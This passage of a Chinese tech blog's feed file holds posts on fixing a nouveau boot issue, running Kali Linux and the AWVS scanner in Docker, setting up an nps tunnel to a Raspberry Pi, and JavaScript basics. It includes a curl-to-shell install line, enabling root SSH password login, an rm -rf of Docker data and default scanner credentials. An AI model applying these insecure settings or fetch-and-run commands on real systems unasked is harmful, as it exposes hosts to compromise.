<li><p>在这里添加这串字符<code>nouveau.modeset=0;</code>，splash在前面也可以<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511105947952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="在这里插入图片描述"></p>
<p>   俺F10值启动发现就可以进入系统了<br>   <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110429756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>添加GRUB添加内核参数<br>进入<code>sudo vim /etc/default/grub</code><br>添加这个<code>splash nouveau.modeset=0</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200511110632400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70"></p>
<p>命令<code>update-grub</code></p>
<h2 id="解决这个问题参考了很多网上的资料，"><a href="#解决这个问题参考了很多网上的资料，" class="headerlink" title="解决这个问题参考了很多网上的资料，"></a>解决这个问题参考了很多网上的资料，</h2><h2 id="QQ2737977997"><a href="#QQ2737977997" class="headerlink" title="QQ2737977997"></a>QQ2737977997</h2></li>
</ol>
]]></content>
      <categories>
        <category>问题的解决</category>
      </categories>
      <tags>
        <tag>问题的解决</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云docker安装kali Linux</title>
    <url>/2020/12/10/%E9%98%BF%E9%87%8C%E4%BA%91docker%E5%AE%89%E8%A3%85kali%20Linux/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p>Docker 是一个开源的应用容器引擎</p>
<p>他可以解决环境不一致，叫整个环境打包成一个集装箱，然后别人下载下来运行就不会出错了</p>
<p>容器是完全使用沙箱机制，就是隔离型，他运行的时候会在Linux内核里面开辟一个空间，这个空间不会影响其他的东西</p>
<p>虚拟机会站很大的空间，虚拟机会创建一个内核，</p>
<h2 id="Docker与虚拟机的区别"><a href="#Docker与虚拟机的区别" class="headerlink" title="Docker与虚拟机的区别"></a>Docker与虚拟机的区别</h2><p>docker有着比虚拟机更少的抽象层<br>Docker用的是物理机的内核<br>vm是自己创建一个内核环境会变的很慢</p>
<h2 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h2><p>他有Docker-ce版本的介绍社区版本的和Docker-ee企业版本</p>
<p>kali安装运行下面这个命令就可以直接安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209104838.png"></p>
<p>如果是其他的linux可以用下面这个命令安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br></pre></td></tr></table></figure>
<h2 id="Docker的卸载"><a href="#Docker的卸载" class="headerlink" title="Docker的卸载"></a>Docker的卸载</h2><p>卸载依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>卸载资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br></pre></td></tr></table></figure>

<h2 id="下载kali"><a href="#下载kali" class="headerlink" title="下载kali"></a>下载kali</h2><p>下面我先下载一个kali Linux容器<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull kalilinux&#x2F;kali-linux-docker</span><br></pre></td></tr></table></figure>
<h2 id="运行和进入容器"><a href="#运行和进入容器" class="headerlink" title="运行和进入容器"></a>运行和进入容器</h2><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name kali -it -p 5555:22  a1765e8e381e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><code>--name</code> 容器名称：指定容器的名称<br><code>-it</code>    交互方法运行  主机可以进入<br><code>-p</code> 宿主机端口:容器端口：为了映射当前Linux端口和容器端口 ，他还有个<code>-P</code>他会随机指定端口<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210094427.png"></p>
<h2 id="配置kali"><a href="#配置kali" class="headerlink" title="配置kali"></a>配置kali</h2><p><strong>设置密码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">passwd </span><br></pre></td></tr></table></figure>
<p><strong>更新源</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  update</span><br></pre></td></tr></table></figure>
<p><strong>下载常用的命令</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install net-tools</span><br></pre></td></tr></table></figure>
<p><strong>下载vim</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  install vim</span><br></pre></td></tr></table></figure>
<p><strong>下载ssh</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install ssh</span><br></pre></td></tr></table></figure>
<p>配置ssh运行ROOT用户连接<br>修改<code>vim /etc/ssh/sshd_config</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#PermitRootLogin prohibit-password修改成PermitRootLogin yes</span><br><span class="line">#PasswordAuthentication yes修改成PasswordAuthentication yes</span><br></pre></td></tr></table></figure>
<p><strong>启动ssh</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;ssh start</span><br></pre></td></tr></table></figure>
<h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h2><p>在容器里面输入<code>exit</code>退出容器，这个退出之后容器也会停止</p>
<p>如果不行停止可以用<code>Ctrl+P+Q</code>，这样退出容器不会停止运行</p>
<h2 id="远程连接容器kali"><a href="#远程连接容器kali" class="headerlink" title="远程连接容器kali"></a>远程连接容器kali</h2><p>用ssh进行连接<br>可以看见连接到了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201210105632.png"></p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>Docker容器搭建</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云搭建nps内网穿透给树莓派用</title>
    <url>/2020/10/04/%E9%98%BF%E9%87%8C%E4%BA%91%E6%90%AD%E5%BB%BAnps%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E7%BB%99%E6%A0%91%E8%8E%93%E6%B4%BE%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="环境介绍和下载地址"><a href="#环境介绍和下载地址" class="headerlink" title="环境介绍和下载地址"></a>环境介绍和下载地址</h2><p>下面的方法支持全部的linux系统<br>我用的是阿里云的服务器和一个树莓派kali linux系统的 </p>
<p>下载地址<a href="https://github.com/ehang-io/nps/releases">https://github.com/ehang-io/nps/releases</a><br>找到对应的系统版本<br>树莓派是<code>arm</code><br>普通电脑<code>amd</code><br><code>client</code>为客户端<br><code>server</code>为服务端</p>
<h2 id="阿里云服务器安装"><a href="#阿里云服务器安装" class="headerlink" title="阿里云服务器安装"></a>阿里云服务器安装</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&#x2F;releases&#x2F;download&#x2F;v0.26.8&#x2F;linux_amd64_server.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf linux_amd64_server.tar.gz</span><br></pre></td></tr></table></figure>
<p>下载安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;nps install</span><br></pre></td></tr></table></figure>
<p>启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;nps start</span><br></pre></td></tr></table></figure>
<p>他把文件安装在<code>/etc/nps/</code><br>他的配置文件在<code>/etc/nps/conf/nps.conf</code><br>进入配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;nps&#x2F;conf&#x2F;nps.conf</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004111638.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004112001.png"></p>
<p>配置完成后重启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;nps restart|</span><br></pre></td></tr></table></figure>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><p>阿里云添加规则<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004114726.png"><br>访问<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004112331.png"><br>添加客户端<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004112440.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004112739.png"><br>注意这个密钥下面会用到<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004112939.png"></p>
<h2 id="树莓派安装"><a href="#树莓派安装" class="headerlink" title="树莓派安装"></a>树莓派安装</h2><p>下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;ehang-io&#x2F;nps&#x2F;releases&#x2F;download&#x2F;v0.26.8&#x2F;linux_arm64_client.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar -zxvf linux_arm64_client.tar.gz</span><br></pre></td></tr></table></figure>
<p>解压出来会有一个npc文件连接nps服务器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;npc -server&#x3D;阿里云的IP:客户端连接的端口  -vkey&#x3D;密钥</span><br></pre></td></tr></table></figure>
<p>连接成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004113728.png"></p>
<h2 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h2><p>已经连接上了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004113829.png"></p>
<p>添加隧道<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004113927.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004114433.png"><br>客户端ID在<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004114529.png"></p>
<h2 id="配置结果"><a href="#配置结果" class="headerlink" title="配置结果"></a>配置结果</h2><p>可以看见可以访问了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201004114856.png"></p>
<h2 id="添加开机自启动"><a href="#添加开机自启动" class="headerlink" title="添加开机自启动"></a>添加开机自启动</h2><p>创建一个<code>nps.sh</code>文件文件内容</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> 树莓派nps解压出来的文件目录</span><br><span class="line">./npc -server=阿里云的IP:客户端连接的端口  -vkey=密钥</span><br></pre></td></tr></table></figure>
<p>执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 777 nps.sh</span><br></pre></td></tr></table></figure>
<p>添加启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;xdg&#x2F;autostart&#x2F;nps.desktop</span><br><span class="line">内容</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name&#x3D;nps</span><br><span class="line">Type&#x3D;Application</span><br><span class="line">Exec&#x3D;上面那个nps.sh文件地址</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云Docker安装AWVS</title>
    <url>/2020/12/14/%E9%98%BF%E9%87%8C%E4%BA%91Docker%E5%AE%89%E8%A3%85AWVS/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>我是一个菜鸡</strong><br><strong>在网上文章都是写的很简单启动容器就可以访问web了。我查看检验值也是一样的，但是我怎么访问不了那？？？？？</strong><br><strong>我进入容器发现他根本就没有启动AWVS服务，在物理机也是这样，他怎么能访问的那？？？？</strong><br><strong>我最烦写文章不写全的人了迷惑行为现在网上有很多，就写那前面一点点然后叫中间的不写直接写就写测试的效果了？？？？？？？？？</strong><br><strong>我感觉写文章就是叫被人看的，你写成那样为了什么，为了迷惑别人，自学都比容易何必那</strong></p>
<p><strong>其他就不废话了</strong><br><strong>开始安装</strong><br><strong>我的阿里云系统是Ubuntu</strong></p>
<h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p>Docker 是一个开源的应用容器引擎</p>
<p>他可以解决环境不一致，叫整个环境打包成一个集装箱，然后别人下载下来运行就不会出错了</p>
<p>容器是完全使用沙箱机制，就是隔离型，他运行的时候会在Linux内核里面开辟一个空间，这个空间不会影响其他的东西</p>
<p>虚拟机会站很大的空间，虚拟机会创建一个内核，</p>
<h2 id="Docker与虚拟机的区别"><a href="#Docker与虚拟机的区别" class="headerlink" title="Docker与虚拟机的区别"></a>Docker与虚拟机的区别</h2><p>docker有着比虚拟机更少的抽象层<br>Docker用的是物理机的内核<br>vm是自己创建一个内核环境所以会变的很慢</p>
<h2 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h2><p>他有Docker-ce版本的介绍社区版本的和Docker-ee企业版本</p>
<p>kali安装运行下面这个命令就可以直接安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201209104838.png"></p>
<p>如果是其他的linux可以用下面这个命令安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -s https:&#x2F;&#x2F;get.docker.com&#x2F; | sh</span><br></pre></td></tr></table></figure>
<h2 id="Docker的卸载"><a href="#Docker的卸载" class="headerlink" title="Docker的卸载"></a>Docker的卸载</h2><p>卸载依赖</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum remove docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure>
<p>卸载资源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br></pre></td></tr></table></figure>
<h2 id="Docker安装AWVS"><a href="#Docker安装AWVS" class="headerlink" title="Docker安装AWVS"></a>Docker安装AWVS</h2><p>搜索一下他有很多版本<br>命令<code>docker search awvs</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214103351.png"></p>
<h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h3><p>就下载这个版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull secfa&#x2F;docker-awvs</span><br></pre></td></tr></table></figure>
<h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run --name AWVS -it  -p 指定的服务器端口:3443 secfa&#x2F;docker-awvs  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><code>--name </code>容器名称：指定容器的名称<br><code>-it</code> 交互方法运行 主机可以进入<br><code>-p</code> 宿主机端口:容器端口：为了映射当前Linux端口和容器端口 ，他还有个-P他会随机指定端口<br><code>secfa/docker-awvs</code> 是要启动的镜像<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash<br>可以看见已经进入容器了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214104049.png"></p>
<h3 id="AWVS容器基本配置"><a href="#AWVS容器基本配置" class="headerlink" title="AWVS容器基本配置"></a>AWVS容器基本配置</h3><p>更新一下源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get  update</span><br></pre></td></tr></table></figure>
<p>下载基本命令不然连<code>ifconfig</code>命令都没有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install net-tools</span><br></pre></td></tr></table></figure>
<h3 id="启动AWVS"><a href="#启动AWVS" class="headerlink" title="启动AWVS"></a>启动AWVS</h3><p>默认没有启动AWVS</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214110514.png"></p>
<p>切换成acunetix用户,应为安装<code>acunetix</code>他会创建一个<code>acunetix</code>用户用来管理<code>acunetix</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su acunetix</span><br></pre></td></tr></table></figure>
<p>进入了acunetix<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214110748.png"><br>查看一下文件有一个<code>.acunetix</code>的文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd .acunetix</span><br></pre></td></tr></table></figure>
<p>进入<code>.acunetix</code>可以看见有一个<code>start.sh</code>文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214110903.png"><br>我们运行<code>start.sh</code>文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;start.sh</span><br></pre></td></tr></table></figure>
<p>可以看见一下启动了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214111117.png"></p>
<p>我们怎么退出那<br>如果我们直接按<code>Ctrl+c</code>程序就会停止<br>我们按可以用<code>Ctrl+P+Q</code>，这样退出容器不会停止运行</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214111445.png"></p>
<h3 id="查看AWVS有没有启动成功"><a href="#查看AWVS有没有启动成功" class="headerlink" title="查看AWVS有没有启动成功"></a>查看AWVS有没有启动成功</h3><p>查看容器ID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps -a </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214114841.png"></p>
<p>直接访问你配置的https://服务器ip:指定的服务器端口/看看能不能访问<br>可以看见可以访问<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214112218.png"></p>
<p>获取直接进入容器看看<br>用<code>attach</code>参数进入容器会进入当前正在启动的容器里面所以要用<code>exec</code>参数来启动<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器ID  &#x2F;bin&#x2F;bash </span><br></pre></td></tr></table></figure>
<p><code>-it</code> 交互方法运行 主机可以进入<br><code>/bin/bash</code> 是运行控制台 载入容器后运行 ，docker中必须要保持一个进程的运行，要不然整个容器启动后就会马上kill itself，这个/bin/bash就表示启动容器后启动bash<br>可以看见已经进入容器了<br>进入容器了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214112612.png"></p>
<p>运行<code>netstat -ntlp</code>查看开发的端口</p>
<p>可以看见已经开了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214112642.png"></p>
<h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p>他的默认用户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">用户: admin@admin.com</span><br><span class="line"></span><br><span class="line">密码：Admin123</span><br></pre></td></tr></table></figure>
<p>登录上面去了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214112921.png"></p>
<h3 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h3><p>进入容器里面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器ID  &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214114644.png"></p>
<p>进入容器<br>进入<code>cd /home/acunetix/.acunetix</code>目录<br>运行<code>change_credentials.sh</code>文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214115042.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;change_credentials.sh</span><br></pre></td></tr></table></figure>
<p>这样就可以了就可以去登录了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201214115216.png"></p>
]]></content>
      <categories>
        <category>Docker容器</category>
      </categories>
      <tags>
        <tag>安装</tag>
      </tags>
  </entry>
  <entry>
    <title>1.JavaScript基础</title>
    <url>/2020/11/23/1.JavaScript/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>我之前看过教程的js然后过段时间就忘了，现在我在B站上了一个教程叫笔记写下来了</strong></p>
<h2 id="定义javascript"><a href="#定义javascript" class="headerlink" title="定义javascript"></a>定义javascript</h2><p>下面是js的用<code>&lt;script&gt;</code>标签来定义js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="comment">//这里面是js的代码</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><h3 id="alert-和window-alert-弹出警告窗"><a href="#alert-和window-alert-弹出警告窗" class="headerlink" title="alert()和window.alert()弹出警告窗"></a>alert()和window.alert()弹出警告窗</h3><p>alert()和window.alert()是一样的只是省略<br><code>alert()</code>是弹出警告窗口<br>咧<br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">     alert(<span class="string">&quot;你好&quot;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117090011.png"><br>window.alert()</p>
<h3 id="document-write-在页面中打印"><a href="#document-write-在页面中打印" class="headerlink" title="document.write()在页面中打印"></a>document.write()在页面中打印</h3><p>document.write()在页面中输出出来<br>咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">     <span class="built_in">document</span>.write(<span class="string">&quot;你好&quot;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117090521.png"></p>
<h3 id="console-log-向控制台输出"><a href="#console-log-向控制台输出" class="headerlink" title="console.log()向控制台输出"></a>console.log()向控制台输出</h3><p>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">     <span class="built_in">console</span>.log(<span class="string">&quot;你好&quot;</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117090721.png"></p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>在js里面用<code>var</code>来声明变量<br>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var 变量名&#x3D;他的值;</span><br></pre></td></tr></table></figure>
<p>咧<br>代码</p>
<p>下面的代码是声明了一个<code>a</code>变量值是<code>你好</code>用alert()输出出来</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="string">&quot;你好&quot;</span>;</span></span><br><span class="line">    alert(a);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117093816.png"></p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">null	空值，表示非对象</span><br><span class="line">undefined	未定义的值，表示未赋值的初始化值</span><br><span class="line">number	数字，数学运算的值</span><br><span class="line">string	字符串，表示信息流</span><br><span class="line">boolean	布尔值，逻辑运算的值</span><br><span class="line">object	对象，表示复合结构的数据集</span><br></pre></td></tr></table></figure>
<p>检查是什么数据类型用<code>typeof 变量名</code></p>
